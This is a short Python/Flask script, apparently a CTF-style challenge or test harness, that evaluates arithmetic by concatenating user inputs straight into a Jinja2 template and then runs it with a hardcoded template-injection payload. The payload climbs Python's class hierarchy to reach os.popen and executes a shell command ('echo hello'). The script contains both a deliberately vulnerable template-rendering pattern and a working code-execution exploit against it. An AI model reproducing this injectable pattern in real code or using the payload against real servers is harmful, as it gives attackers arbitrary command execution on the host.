import time
import random
from flask import Flask, request, render_template
from jinja2 import Template
import re
import concurrent.futures

def calculate(data):
    a = data.get('a')
    b = data.get('b')

    try:
        random_sleep = random.uniform(0.1, 0.3)
        time.sleep(random_sleep)

        template_str = """
        {{ """ + a + """ + """ + b + """ }}
        """

        print(template_str)
    
        template = Template(template_str)
        result = template.render()

        return {'result': result}
    
    except Exception as e:
        print('except', e)
        return {'result': 'Error'}

def execute_with_timeout(data, timeout=0.5):
    with concurrent.futures.ThreadPoolExecutor() as executor:
        future = executor.submit(calculate, data)
        try:
            result = future.result(timeout=timeout)
            print(result)
            return result
        except concurrent.futures.TimeoutError:
            return {'result': 'Error: Timeout'}

def cal():
    a = "0 if 'f' in ''.__class__.__mro__[-1].__subclasses__()[156].__init__.__globals__['sys'].modules['os'].popen('echo hello').read() else 0"
    b = '1'

    try:
        data = {'a': a, 'b': b}
        response = execute_with_timeout(data)
        result = response.get('result')

        pattern = r'[0-1]'

        return result
        
        """ if re.fullmatch(pattern, result.strip()):
            return result
        else:
            return render_template('result.html', result="Only 0, 1") """
    except Exception as e:
        return render_template('index.html')

print(cal())